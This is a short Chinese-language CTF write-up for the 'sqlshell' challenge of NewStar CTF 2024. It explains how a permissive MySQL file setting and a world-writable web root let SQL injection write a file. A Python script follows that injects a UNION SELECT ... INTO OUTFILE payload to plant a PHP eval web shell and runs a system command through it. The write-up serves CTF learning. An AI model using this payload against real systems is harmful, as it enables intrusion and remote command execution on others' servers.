---
titleTemplate: ":title | WriteUp - NewStar CTF 2024"
---

# sqlshell

mysql 启动时，加了选项 `--secure_file_priv=''`，这个的选项作用是允许 mysql 进行文件读写。

- 如果这个选项是 `NULL`，说明不能进行文件读写
- 如果这个选项是指定的目录，说明只能对指定目录进行文件读写
- 如果这个选项是空字符串，也就是 `''`，能对任意目录进行文件读写

程序运行时，执行了命令 `chmod 777 /var/www/html`，作用是允许该目录被所有用户写入文件。

所以思路就是通过注入 SQL 语句，进行写文件，写一个木马到网站根目录（`/var/www/html`）下即可。

```python
import requests

url = 'http://192.168.109.128:8889'

payload = '\' || 1 union select 1,2,"<?php eval($_GET[1]);" into outfile \'/var/www/html/3.php\'#'

res = requests.get(url,params={'student_name': payload})
res = requests.get(f'{url}/3.php', params={'1': 'system("cat /you_cannot_read_the_flag_directly");'})
print(res.text)
```
